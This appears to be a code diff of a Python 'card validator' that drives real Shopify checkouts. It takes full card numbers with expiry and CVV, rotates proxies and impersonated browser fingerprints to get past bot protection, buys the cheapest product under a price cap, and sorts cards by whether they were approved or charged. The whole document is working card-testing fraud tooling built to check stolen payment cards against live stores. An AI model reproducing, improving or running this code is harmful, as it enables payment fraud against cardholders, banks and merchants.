-                               "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
-                               "CARD_NOT_SUPPORTED", "INVALID_PAYMENT_METHOD")):
+    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER",
+                              "INVALID_CARD", "INCORRECT_NUMBER", "BAD_NUMBER",
+                              "INVALID_ACCOUNT", "CARD_NOT_SUPPORTED",
+                              "INVALID_PAYMENT_METHOD")):
         return "INVALID_CARD"
-    if any(k in msg for k in ("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION",
-                               "PICKUP_CARD", "STOP_PAYMENT")):
-        return "CARD_DECLINED"
-    if any(k in msg for k in ("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
-                               "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
-                               "TRY_AGAIN_LATER", "CARD_TESTING")):
-        return "CARD_DECLINED"
     return "CARD_DECLINED"
 
 
-def _parse_gql_errors(errors: list) -> str:
-    for err in errors:
-        for field in ("code", "nonLocalizedMessage", "localizedMessage",
-                      "message", "localizedMessageHtml", "messageUntranslated"):
-            raw = str(err.get(field) or "")
-            if not raw:
-                continue
-            norm = _normalize_response(raw)
-            if norm != "CARD_DECLINED":
-                return norm
-            upper = raw.upper()
-            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
-                                         "CHARGE_DECLINED", "CARD_WAS_DECLINED",
-                                         "FRAUD")):
-                return "CARD_DECLINED"
-            if any(k in upper for k in ("CHECKOUT_ALREADY_COMPLETED", "ALREADY_ACCEPTED")):
-                return "CARD_DECLINED"
-            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
-                                         "TOKEN_EXPIRED", "INVALID_SESSION")):
-                return "SESSION_EXPIRED"
-            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
-                                         "CUSTOMER_DISABLED")):
-                return "SITE_REQUIRES_LOGIN"
-            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
-                                         "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
-                return "NO_PRODUCT"
-            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
-                                         "RATE_LIMITED", "RETRY_LATER")):
-                return "THROTTLED"
-    return "GRAPHQL_ERROR"
-
-
-def _make_session(proxy_str: Optional[str]) -> tuple[AsyncSession, dict, bool]:
-    profile = random.choice(BROWSER_PROFILES)
-    proxy = _parse_proxy(proxy_str) if proxy_str else None
-    proxies = {"http": proxy, "https": proxy} if proxy else None
-    session = AsyncSession(impersonate=profile["impersonate"], timeout=REQUEST_TIMEOUT, proxies=proxies)
-    return session, profile, True
+def _is_site_error(code: str) -> bool:
+    return code in ("SITE_ERROR", "THROTTLED", "SESSION_EXPIRED",
+                    "SITE_REQUIRES_LOGIN", "NO_PRODUCT",
+                    "NO_PAYMENT_GATEWAY", "NO_SHOPIFY_PAYMENTS_GATEWAY",
+                    "GRAPHQL_ERROR", "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
+                    "CART_FAILED", "CHECKOUT_FAILED", "NO_SELLER_PROPOSAL",
+                    "NEGOTIATE_FAILED", "CHECKPOINTDENIED",
+                    "TOKENIZATION_FAILED", "SUBMIT_FAILED",
+                    "ORDER_CREATION_FAILED", "SITE_SKIP",
+                    "NO_PAYMENT_REQUIRED")
 
 
 # ---------------------------------------------------------------------------
@@ -802,7 +726,10 @@ async def _fetch_products(
     proxy_str: Optional[str] = None,
     max_price: float = MAX_PRICE,
 ) -> tuple[Optional[dict], list[dict], Optional[str]]:
-    """Returns (best_product, all_candidates, error_string)."""
+    """
+    Returns (best_product, all_candidates_under_max_price, error_string).
+    Results are cached per hostname for CACHE_TTL seconds.
+    """
     if not base_url.startswith("http"):
         base_url = "https://" + base_url
 
@@ -855,76 +782,35 @@ async def _fetch_products(
         best_price             = float("inf")
 
         if not all_variants:
-            # Fallback to sitemap
-            try:
-                import xml.etree.ElementTree as ET
-                sitemap_url = f"{base_url}/sitemap_products_1.xml"
-                smap_resp = await session.get(sitemap_url, allow_redirects=True)
-                if smap_resp.status_code == 200:
-                    root = ET.fromstring(smap_resp.content)
-                    urls = []
-                    for child in root:
-                        if child.tag.endswith('url'):
-                            for loc in child:
-                                if loc.tag.endswith('loc'):
-                                    urls.append(loc.text)
+            return None, [], "No products found"
 
-                    if urls:
-                        sample_urls = random.sample(urls, min(25, len(urls)))
-                        for purl in sample_urls:
-                            try:
-                                p_resp = await session.get(purl, allow_redirects=True)
-                                matches = re.finditer(r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)', p_resp.text)
-                                for m in matches:
-                                    variant_id = m.group(1)
-                                    price = float(m.group(2))
-                                    if 0 < price:
-                                        entry = {
-                                            "site":       base_url,
-                                            "price":      f"{price:.2f}",
-                                            "price_f":    price,
-                                            "variant_id": str(variant_id),
-                                            "title":      "Product",
-                                            "handle":     "",
-                                        }
-                                        candidates.append(entry)
-                                        if price < best_price:
-                                            best_price = price
-                                            best       = entry
-                            except Exception:
-                                pass
-            except Exception:
-                pass
-
-            if not candidates:
-                return None, [], "No products found"
-        else:
-            for product in all_variants:
-                p_title = str(product.get("title", "")).lower()
-                if any(bad in p_title for bad in ("tip", "donation", "gift card", "warranty", "route package", "insurance")):
+        for product in all_variants:
+            p_title = str(product.get("title", "")).lower()
+            if any(bad in p_title for bad in ("tip", "donation", "gift card", "warranty",
+                                              "route package", "insurance")):
+                continue
+            for variant in product.get("variants", []):
+                try:
+                    avail = variant.get("available", True)
+                    if avail is False:
+                        continue
+                    price = float(variant.get("price") or "0")
+                except (ValueError, TypeError):
                     continue
-                for variant in product.get("variants", []):
-                    try:
-                        avail = variant.get("available", True)
-                        if avail is False:
-                            continue
-                        price = float(variant.get("price") or "0")
-                    except (ValueError, TypeError):
-                        continue
-                    if price <= 0.25:
-                        continue
-                    entry = {
-                        "site":       base_url,
-                        "price":      f"{price:.2f}",
-                        "price_f":    price,
-                        "variant_id": str(variant["id"]),
-                        "title":      product.get("title", "Product"),
-                        "handle":     product.get("handle", ""),
-                    }
-                    candidates.append(entry)
-                    if price < best_price:
-                        best_price = price
-                        best       = entry
+                if price <= 0.25:
+                    continue
+                entry = {
+                    "site":       base_url,
+                    "price":      f"{price:.2f}",
+                    "price_f":    price,
+                    "variant_id": str(variant["id"]),
+                    "title":      product.get("title", "Product"),
+                    "handle":     product.get("handle", ""),
+                }
+                candidates.append(entry)
+                if price < best_price:
+                    best_price = price
+                    best       = entry
 
         if not best:
             return None, [], "No products found"
@@ -943,6 +829,63 @@ async def _fetch_products(
                 await res
 
 
+def _make_session(proxy_str: Optional[str]) -> tuple[AsyncSession, dict, bool]:
+    profile = random.choice(BROWSER_PROFILES)
+    proxy = _parse_proxy(proxy_str) if proxy_str else None
+    proxies = {"http": proxy, "https": proxy} if proxy else None
+    session = AsyncSession(impersonate=profile["impersonate"], timeout=REQUEST_TIMEOUT, proxies=proxies)
+    return session, profile, True
+
+
+# ---------------------------------------------------------------------------
+# Response builder
+# ---------------------------------------------------------------------------
+def _make_result(
+    response: str,
+    cc_full: str,
+    price: str,
+    gateway: str,
+    site: str,
+    t0: float,
+    detail: str = "",
+    reason: str = "",
+    raw: str = "",
+    charged: bool = False,
+    approved: bool = False,
+    site_error: bool = False,
+) -> dict:
+    """
+    Build the standard API response.
+    response codes are uppercase strings like ORDER_PLACED, 3DS_REQUIRED, CARD_DECLINED, SITE_ERROR.
+    """
+    # Charged/Approved are derived automatically if not provided
+    if not charged and response == "ORDER_PLACED":
+        charged = True
+        approved = True
+    if not approved and response in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
+                                     "3DS_REQUIRED", "DO_NOT_HONOR", "HIGH_RISK",
+                                     "INCORRECT_ZIP", "CALL_ISSUER",
+                                     "LIMIT_EXCEEDED"):
+        approved = True   # gateway accepted, card-side result
+    if not site_error:
+        site_error = _is_site_error(response)
+
+    return {
+        "Response":  response,
+        "CC":        cc_full,
+        "Price":     price,
+        "Gate":      gateway,
+        "Site":      site,
+        "Charged":   "True" if charged else "False",
+        "Approved":  "True" if approved else "False",
+        "SiteError": "True" if site_error else "False",
+        "Detail":    detail,
+        "Reason":    reason,
+        "Raw":       raw[:300] if raw else "",
+        "Time":      f"{round(time.time() - t0, 2)}s",
+    }
+
+
 # ---------------------------------------------------------------------------
 # Core checkout validator
 # ---------------------------------------------------------------------------
@@ -954,38 +897,26 @@ async def validate_card(
     site_url:   str,
     variant_id: Optional[str] = None,
     proxy_str:  Optional[str] = None,
-    max_price:  Optional[float] = None,
+    max_price:  float = MAX_PRICE,
 ) -> dict:
     """
-    Full Shopify checkout flow. Returns dict with Response, CC, Price, Gate,
-    Site, Charged, Approved, Time, and Reason (for approvals/declines).
+    Full Shopify checkout flow.
+
+    Returns a dict with Response, CC, Price, Gate, Site, Charged, Approved,
+    SiteError, Detail, Reason, Raw, Time.
     """
     t0       = time.time()
     gateway  = "UNKNOWN"
     price    = "0.00"
     currency = "USD"
+    cc_full  = f"{cc}|{month}|{year}|{cvv}"
 
     site_url = site_url.strip()
     ourl     = site_url if site_url.startswith("http") else f"https://{site_url}"
     hostname = urlparse(ourl).netloc
 
-    effective_max_price = max_price if max_price is not None else MAX_PRICE
-
-    def _r(response: str, charged: str = "False", approved: str = "False",
-           reason: str = "") -> dict:
-        out = {
-            "Response": response,
-            "CC":       f"{cc}|{month}|{year}|{cvv}",
-            "Price":    price,
-            "Gate":     gateway,
-            "Site":     ourl,
-            "Charged":  charged,
-            "Approved": approved,
-            "Time":     f"{round(time.time() - t0, 2)}s",
-        }
-        if reason:
-            out["Reason"] = reason
-        return out
+    def R(response, **kw):
+        return _make_result(response, cc_full, price, gateway, ourl, t0, **kw)
 
     sem = _site_semaphores[hostname]
     session, profile, owned = _make_session(proxy_str)
@@ -1001,33 +932,56 @@ async def validate_card(
             state  = addr["zoneCode"]
             s_zip  = addr["postalCode"]
 
-            # ── 0. Resolve product / variant ─────────────────────────────
+            # ── 0. Fetch product / validate variant ──────────────────────
+            best, all_candidates, err = await _fetch_products(ourl, proxy_str)
+
             if variant_id:
-                # Fast path: caller gave us variant_id → skip product fetch.
-                variant_id = str(variant_id).strip()
-                # Try to enrich price from cache if available (best-effort)
-                cached = _product_cache.get(hostname)
-                if cached and cached.get("candidates"):
-                    for c in cached["candidates"]:
-                        if str(c.get("variant_id")) == variant_id:
-                            price = c["price"]
-                            break
-            else:
-                best, _all_candidates, err = await _fetch_products(
-                    ourl, proxy_str, max_price=effective_max_price
+                # Caller supplied a variant. Verify it exists and get its price.
+                matched = next(
+                    (c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)),
+                    None,
                 )
+                if not matched:
+                    # Re-fetch per-variant price by hitting the product json
+                    try:
+                        pj = await session.get(f"{ourl}/products.json?limit=250",
+                                               headers={"User-Agent": profile["ua"]})
+                        if pj.status_code == 200:
+                            data = orjson.loads(pj.content)
+                            for prod in data.get("products", []):
+                                for v in prod.get("variants", []):
+                                    if str(v.get("id")) == str(variant_id):
+                                        matched = {
+                                            "variant_id": str(v.get("id")),
+                                            "price":      f"{float(v.get('price')):.2f}",
+                                            "price_f":    float(v.get("price")),
+                                            "title":      prod.get("title", "Product"),
+                                            "handle":     prod.get("handle", ""),
+                                            "site":       ourl,
+                                        }
+                                        break
+                                if matched:
+                                    break
+                    except Exception:
+                        pass
+                if not matched:
+                    return R("SITE_ERROR", reason="Variant not found on this store",
+                             detail=f"variant_id={variant_id} not present in products.json")
+                price = matched["price"]
+            else:
                 if not best:
-                    return _r(f"NO_PRODUCT: {err}")
+                    return R("SITE_ERROR", reason="Could not fetch products",
+                             detail=str(err))
                 variant_id = best["variant_id"]
                 price      = best["price"]
-                try:
-                    if float(best.get("price_f", 0)) > effective_max_price:
-                        return _r(
-                            f"NO_CHEAP_PRODUCTS: cheapest=${best['price']} > max=${effective_max_price:.2f}"
-                        )
-                except (ValueError, TypeError):
-                    pass
 
+            # ── Pre-flight price check (product only) ────────────────────
+            product_price_f = float(price)
+            if product_price_f >= max_price:
+                return R("SITE_SKIP",
+                         reason=f"Product price ${product_price_f:.2f} ≥ max ${max_price:.2f}")
+
+            # ── 1. Add to cart ──────────────────────────────────────────
             base_headers = {
                 "User-Agent":         profile["ua"],
                 "Accept":             "application/json, text/plain, */*",
@@ -1041,11 +995,9 @@ async def validate_card(
                 base_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
                 base_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
 
-            # ── 1. Add to cart ──────────────────────────────────────────
             cart_added = False
             for payload, ct in [
-                (f"id={variant_id}&quantity=1",
-                 "application/x-www-form-urlencoded"),
+                (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
                 (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                  "application/json"),
             ]:
@@ -1062,8 +1014,7 @@ async def validate_card(
                     continue
 
             if not cart_added:
-                return _r("CART_FAILED",
-                          reason="Could not add variant to cart (sold out / invalid variant / bot protection)")
+                return R("SITE_ERROR", reason="Cart rejected add-to-cart")
 
             await asyncio.sleep(random.uniform(0.12, 0.35))
 
@@ -1078,14 +1029,13 @@ async def validate_card(
                 checkout_url = str(cr.url)
                 page_text    = cr.text
             except (asyncio.TimeoutError, RequestsError):
-                return _r("TIMEOUT")
+                return R("SITE_ERROR", reason="Checkout page timed out")
             except Exception as ex:
-                return _r(f"CHECKOUT_FAILED: {type(ex).__name__}")
+                return R("SITE_ERROR", reason=f"Checkout request failed: {type(ex).__name__}")
 
             lower_url = checkout_url.lower()
             if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
-                return _r("SITE_REQUIRES_LOGIN",
-                          reason="Store requires customer login before checkout")
+                return R("SITE_REQUIRES_LOGIN", reason="Store requires login/password")
 
             m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
             if m:
@@ -1094,13 +1044,11 @@ async def validate_card(
                 attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]
 
             if not attempt_token or len(attempt_token) < 4:
-                return _r("NO_ATTEMPT_TOKEN",
-                          reason=f"Could not parse attempt token from URL: {checkout_url[:100]}")
+                return R("SITE_ERROR", reason="Could not extract attempt token")
 
             sst = _extract_sst(page_text, dict(cr.headers))
             if not sst:
-                return _r("NO_SESSION_TOKEN",
-                          reason="Checkout page loaded but session token not found (possible captcha)")
+                return R("SITE_ERROR", reason="Could not extract session token (bot protection?)")
 
             queue_token = (
                 _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
@@ -1145,7 +1093,7 @@ async def validate_card(
             )
             if not subtotal:
                 m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
-                subtotal = m2.group(1) if m2 else "0.01"
+                subtotal = m2.group(1) if m2 else price
 
             unescaped  = page_text.replace("&quot;", '"').replace("&amp;", "&")
             build_id   = None
@@ -1299,21 +1247,19 @@ async def validate_card(
                 gql_errs = resp_json.get("errors", []) or []
                 if gql_errs:
                     log.debug("shipping proposal GQL errors: %s", gql_errs)
-                    interpreted = _parse_gql_errors(gql_errs)
-                    if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
-                                       "THROTTLED", "NO_PRODUCT"):
-                        return _r(interpreted,
-                                  reason=f"Shipping proposal error: {gql_errs[:1]}")
+                    code = _parse_gql_errors(gql_errs)
+                    if code in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
+                                "THROTTLED", "NO_PRODUCT", "SITE_ERROR"):
+                        return R(code, reason="GraphQL error during shipping proposal")
                     if attempt < 2:
                         await asyncio.sleep(1.5)
                         continue
-                    return _r(interpreted if interpreted != "GRAPHQL_ERROR"
-                              else "GRAPHQL_ERROR",
-                              reason=f"Shipping proposal failed: {str(gql_errs)[:150]}")
+                    return R("GRAPHQL_ERROR",
+                             reason="Shipping proposal failed after retries",
+                             detail=str(gql_errs)[:200])
 
             if not resp_json or not (resp_json.get("data") or {}).get("session"):
-                return _r("GRAPHQL_ERROR",
-                          reason="Shipping proposal returned no session")
+                return R("GRAPHQL_ERROR", reason="No session in shipping proposal")
 
             try:
                 _ship_sst = r.headers.get("x-checkout-one-session-token")
@@ -1330,47 +1276,55 @@ async def validate_card(
             if neg_errors:
                 code = _parse_gql_errors(neg_errors)
                 if code != "GRAPHQL_ERROR":
-                    return _r(code, reason=f"Negotiate error: {neg_errors[:1]}")
+                    return R(code, reason="Negotiation error")
 
             result_obj  = negotiate.get("result") or {}
             result_type = result_obj.get("__typename", "")
 
             if result_type == "CheckpointDenied":
-                return _r("CHECKPOINTDENIED",
-                          reason=f"Checkpoint denied. redirect={result_obj.get('redirectUrl', '')[:80]}")
+                return R("SITE_ERROR", reason="Checkpoint denied — likely bot protection")
             if result_type in ("Throttled", "TooManyRequests"):
-                return _r("THROTTLED",
-                          reason=f"Throttled by store ({result_type})")
+                return R("THROTTLED", reason="Site rate-limited us")
             if result_type == "NegotiationResultFailed":
-                return _r("NEGOTIATE_FAILED",
-                          reason="NegotiationResultFailed from shipping proposal")
+                return R("SITE_ERROR", reason="Negotiation failed")
 
             checkpoint_data = result_obj.get("checkpointData")
             seller          = result_obj.get("sellerProposal") or {}
 
             if not seller:
-                return _r("NO_SELLER_PROPOSAL",
-                          reason="sellerProposal missing from shipping response")
+                return R("SITE_ERROR", reason="No seller proposal returned")
 
             running_total_data = seller.get("runningTotal") or {}
             running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")
 
+            # Delivery info — collect ALL strategies so we can pick cheapest
             delivery_data     = seller.get("delivery") or {}
             delivery_strategy = ""
             shipping_amount   = 0.0
+            all_strategies: list[dict] = []
             if delivery_data.get("__typename") == "FilledDeliveryTerms":
                 d_lines = delivery_data.get("deliveryLines") or []
                 if d_lines:
-                    strategies = d_lines[0].get("availableDeliveryStrategies") or []
-                    if strategies:
-                        delivery_strategy = strategies[0].get("handle", "")
-                        try:
-                            amt_data = strategies[0].get("amount") or {}
-                            shipping_amount = float(
-                                amt_data.get("value", {}).get("amount") or amt_data.get("amount") or "0"
-                            )
-                        except (ValueError, TypeError):
-                            shipping_amount = 0.0
+                    all_strategies = d_lines[0].get("availableDeliveryStrategies") or []
+                    if all_strategies:
+                        # Choose the cheapest
+                        cheapest = None
+                        cheapest_val = float("inf")
+                        for st in all_strategies:
+                            try:
+                                amt_data = st.get("amount") or {}
+                                amt = float(
+                                    amt_data.get("value", {}).get("amount")
+                                    or amt_data.get("amount") or "0"
+                                )
+                            except (ValueError, TypeError):
+                                amt = float("inf")
+                            if amt < cheapest_val:
+                                cheapest_val = amt
+                                cheapest     = st
+                        if cheapest:
+                            delivery_strategy = cheapest.get("handle", "")
+                            shipping_amount   = cheapest_val if cheapest_val != float("inf") else 0.0
 
             tax_data   = seller.get("tax") or {}
             tax_amount = 0.0
@@ -1383,29 +1337,40 @@ async def validate_card(
                 except (ValueError, TypeError):
                     pass
 
+            # Check TOTAL price BEFORE tokenizing card
+            try:
+                total_estimate = float(running_total) + shipping_amount + tax_amount
+            except (ValueError, TypeError):
+                total_estimate = 0.0
+            price = f"{total_estimate:.2f}"
+            if total_estimate >= max_price:
+                return R("SITE_SKIP",
+                         reason=f"Total ${total_estimate:.2f} (product+ship+tax) ≥ max ${max_price:.2f}")
+
+            # Payment method — accept any credit-card payment method (Shopify Payments
+            # or other gateway on Shopify checkout — all are card-chargeable).
             payment_data       = seller.get("payment") or {}
             payment_identifier = None
+            gateway_name       = None
             if payment_data.get("__typename") == "FilledPaymentTerms":
                 avail_lines = payment_data.get("availablePaymentLines") or []
                 for line in avail_lines:
                     pm = line.get("paymentMethod") or {}
                     pid = pm.get("paymentMethodIdentifier")
-                    if pid:
-                        detected_gateway = (pm.get("extensibilityDisplayName") or
-                                            pm.get("name") or pm.get("brand") or
-                                            pm.get("displayName") or "Shopify Payments")
-                        if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
-                            payment_identifier = pid
-                            gateway = detected_gateway
-                            try:
-                                price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
-                            except (ValueError, TypeError):
-                                pass
-                            break
+                    if not pid:
+                        continue
+                    pm_type = pm.get("__typename", "")
+                    if pm_type == "CustomerCreditCardPaymentMethod":
+                        continue
+                    payment_identifier = pid
+                    gateway_name       = (pm.get("extensibilityDisplayName")
+                                          or pm.get("name") or "Shopify Payments")
+                    gateway = gateway_name
+                    break
 
             if not payment_identifier:
-                return _r("NO_SHOPIFY_PAYMENTS_GATEWAY",
-                          reason="Store has no Shopify Payments gateway (other gateways blocked)")
+                return R("NO_PAYMENT_GATEWAY",
+                         reason="Site offers no credit-card payment method")
 
             # ── 4. Delivery proposal ─────────────────────────────────────
             deliv_vars = copy.deepcopy(ship_vars)
@@ -1469,17 +1434,13 @@ async def validate_card(
                 if d_result:
                     d_typename = d_result.get("__typename", "")
                     if d_typename == "SubmittedForCompletion":
-                        return _r("NO_PAYMENT_REQUIRED",
-                                  reason="Order auto-submitted before card could be tested (digital goods)")
+                        return R("NO_PAYMENT_REQUIRED",
+                                 reason="Checkout auto-submitted (free/digital goods)")
                     d_seller = d_result.get("sellerProposal") or {}
                     d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                     d_amt    = d_total.get("value", {}).get("amount") or d_total.get("amount")
                     if d_amt:
                         running_total = d_amt
-                        try:
-                            price = f"{float(running_total):.2f}"
-                        except (ValueError, TypeError):
-                            pass
                     d_delivery = d_seller.get("delivery") or {}
                     if d_delivery.get("__typename") == "FilledDeliveryTerms":
                         d_d_lines = d_delivery.get("deliveryLines") or []
@@ -1488,8 +1449,6 @@ async def validate_card(
                             d_selected = d_d_lines[0].get("selectedDeliveryStrategy") or {}
                             if d_selected.get("handle"):
                                 delivery_strategy = d_selected["handle"]
-                            elif d_strategies:
-                                delivery_strategy = d_strategies[0].get("handle", delivery_strategy)
                             if d_strategies:
                                 d_ship_amt = d_strategies[0].get("amount") or {}
                                 try:
@@ -1509,6 +1468,16 @@ async def validate_card(
                             )
                         except (ValueError, TypeError):
                             pass
+
+                    # Re-check total
+                    try:
+                        total_estimate = float(running_total) + shipping_amount + tax_amount
+                    except (ValueError, TypeError):
+                        total_estimate = 0.0
+                    price = f"{total_estimate:.2f}"
+                    if total_estimate >= max_price:
+                        return R("SITE_SKIP",
+                                 reason=f"Total ${total_estimate:.2f} after delivery proposal ≥ max ${max_price:.2f}")
             except Exception as ex:
                 log.debug("delivery proposal error: %s", ex)
 
@@ -1546,10 +1515,8 @@ async def validate_card(
             token = None
             for vault_url in vault_endpoints:
                 try:
-                    vr = await session.post(
-                        vault_url, json=vault_payload,
-                        headers=vault_headers,
-                    )
+                    vr = await session.post(vault_url, json=vault_payload,
+                                            headers=vault_headers)
                     vd = orjson.loads(vr.content)
                     token = vd.get("id")
                     if token:
@@ -1558,10 +1525,9 @@ async def validate_card(
                     continue
 
             if not token:
-                return _r("TOKENIZATION_FAILED",
-                          reason="PCI vault did not return a card token")
+                return R("SITE_ERROR", reason="Card tokenization vault unreachable")
 
-            # ── 6. Submit for completion ──────────────────────────────────
+            # ── 6. Submit for completion ─────────────────────────────────
             billing_addr = {
                 "streetAddress": {
                     "address1": street, "address2": "", "city": city,
@@ -1639,6 +1605,7 @@ async def validate_card(
                 }
 
             s_resp: dict = {}
+            s_data: dict = {}
             for submit_attempt in range(3):
                 try:
                     sr = await session.post(
@@ -1653,41 +1620,35 @@ async def validate_card(
                         sst = _sub_sst
                         gql_headers["x-checkout-one-session-token"] = sst
                 except (asyncio.TimeoutError, RequestsError):
-                    return _r("TIMEOUT")
+                    return R("SITE_ERROR", reason="Submit request timed out")
                 except Exception as ex:
                     log.debug("submit exception: %s", ex)
-                    return _r("SUBMIT_FAILED",
-                              reason=f"Submit exception: {type(ex).__name__}")
-
-                log.debug("submit[%d] response typename: %s", submit_attempt,
-                          (s_resp.get("data") or {}).get("submitForCompletion", {}).get("__typename"))
+                    return R("SITE_ERROR", reason=f"Submit exception: {type(ex).__name__}")
 
                 s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                 if not s_data:
                     errs = s_resp.get("errors") or []
                     log.debug("submit no data, top-level errors: %s", errs)
                     if errs:
-                        for err_item in errs:
-                            for fld in ("code", "message"):
-                                val = str(err_item.get(fld) or "").upper()
-                                if val:
-                                    norm = _normalize_response(val)
-                                    if norm != "CARD_DECLINED":
-                                        approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
-                                        return _r(norm, approved=approved,
-                                                  reason=f"Top-level error: {str(err_item)[:200]}")
-                    return _r("GRAPHQL_ERROR",
-                              reason=f"Submit had no data: {str(errs)[:150]}")
+                        raw = str(errs)
+                        code = classify_raw(raw)
+                        if code == "CARD_DECLINED":
+                            code = "SITE_ERROR"
+                        return R(code, raw=raw,
+                                 reason="Submit returned top-level GraphQL errors")
+                    return R("GRAPHQL_ERROR", reason="Submit returned no data")
 
                 stype = s_data.get("__typename", "")
 
                 if stype == "SubmitRejected":
                     sub_errs = s_data.get("errors") or []
                     all_confirmable = all(
-                        e.get("__typename") == "ConfirmChangeViolation" for e in sub_errs
+                        e.get("__typename") == "ConfirmChangeViolation"
+                        for e in sub_errs
                     ) if sub_errs else False
                     if all_confirmable and submit_attempt < 2:
-                        log.debug("submit[%d] ConfirmChangeViolation, retrying", submit_attempt)
+                        log.debug("submit[%d] ConfirmChangeViolation, retrying",
+                                  submit_attempt)
                         await asyncio.sleep(0.5)
                         continue
                 break
@@ -1695,51 +1656,40 @@ async def validate_card(
             stype = s_data.get("__typename", "")
 
             # ── Handle submit result types ────────────────────────────────
-            if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
+            if stype in ("SubmitSuccess", "SubmittedForCompletion",
+                         "SubmitAlreadyAccepted"):
                 receipt = s_data.get("receipt") or {}
                 rtype   = receipt.get("__typename", "")
 
                 if rtype == "ProcessedReceipt":
-                    return _r("ORDER_PLACED", charged="True", approved="True",
-                              reason="Payment charged successfully, order created")
+                    return R("ORDER_PLACED", charged=True, approved=True)
 
                 if rtype == "ActionRequiredReceipt":
-                    action   = receipt.get("action") or {}
-                    atype    = action.get("__typename", "")
-                    redirect = action.get("url") or action.get("offsiteRedirect") or ""
-                    challenge_type = action.get("challengeType") or ""
-                    timeout_ms = (receipt.get("timeout") or {}).get("millisecondsRemaining")
-                    if "CompletePaymentChallengeV2" in atype:
-                        reason = f"3DS/OTP required (challenge={challenge_type or 'unknown'})"
-                    elif "CompletePaymentChallenge" in atype:
-                        reason = "3DS/OTP required (offsite redirect)"
-                    else:
-                        reason = f"Action required: {atype}"
-                    if redirect:
-                        reason += f" | redirect={str(redirect)[:120]}"
-                    if timeout_ms:
-                        reason += f" | timeout={timeout_ms}ms"
-                    return _r("3DS_REQUIRED", approved="True", reason=reason)
+                    action = receipt.get("action") or {}
+                    action_type = action.get("__typename", "")
+                    detail = f"3DS challenge: {action_type}"
+                    return R("3DS_REQUIRED", approved=True,
+                             reason="Issuer requires 3DS authentication",
+                             detail=detail, raw=str(action)[:300])
 
                 if rtype == "FailedReceipt":
                     pe      = receipt.get("processingError") or {}
                     pe_type = pe.get("__typename", "")
-                    log.debug("FailedReceipt processingError: %s", pe)
-                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
-                        return _r("NO_PRODUCT",
-                                  reason=f"{pe_type}: stock ran out during checkout")
+                    if pe_type in ("InventoryClaimFailure",
+                                   "InventoryReservationFailure"):
+                        return R("NO_PRODUCT",
+                                 reason="Inventory lost during checkout")
                     if pe_type == "OrderCreationFailure":
-                        reverted = pe.get("paymentsHaveBeenReverted")
-                        return _r("ORDER_CREATION_FAILED",
-                                  reason=f"OrderCreationFailure (payments_reverted={reverted})")
+                        return R("ORDER_CREATION_FAILED",
+                                 reason="Order creation failed on site")
                     code = str(pe.get("code") or "").upper()
-                    msg  = str(pe.get("messageUntranslated") or "")
+                    msg  = str(pe.get("messageUntranslated") or "").upper()
                     raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
-                    norm = _normalize_response(raw)
-                    approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
-                    reason = f"{pe_type}: {code or msg or 'unknown'}"
-                    return _r(norm, approved=approved, reason=reason)
+                    norm = classify_raw(raw)
+                    return R(norm, raw=raw,
+                             reason=f"Payment failed: {raw[:120]}")
 
+                # Processing / Waiting → poll
                 rid = receipt.get("id")
                 if rid:
                     poll_body = {
@@ -1759,33 +1709,25 @@ async def validate_card(
                             pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                             pt = pd.get("__typename", "")
                             if pt == "ProcessedReceipt":
-                                return _r("ORDER_PLACED", charged="True", approved="True",
-                                          reason="Payment charged successfully (via poll)")
+                                return R("ORDER_PLACED", charged=True, approved=True)
                             if pt == "ActionRequiredReceipt":
-                                action   = pd.get("action") or {}
-                                atype    = action.get("__typename", "")
-                                redirect = action.get("url") or action.get("offsiteRedirect") or ""
-                                challenge_type = action.get("challengeType") or ""
-                                reason = f"3DS/OTP required ({atype}"
-                                if challenge_type:
-                                    reason += f", challenge={challenge_type}"
-                                reason += ")"
-                                if redirect:
-                                    reason += f" | redirect={str(redirect)[:120]}"
-                                return _r("3DS_REQUIRED", approved="True", reason=reason)
+                                action = pd.get("action") or {}
+                                detail = f"3DS challenge: {action.get('__typename', '')}"
+                                return R("3DS_REQUIRED", approved=True,
+                                         reason="Issuer requires 3DS authentication",
+                                         detail=detail, raw=str(action)[:300])
                             if pt == "FailedReceipt":
                                 pe      = pd.get("processingError") or {}
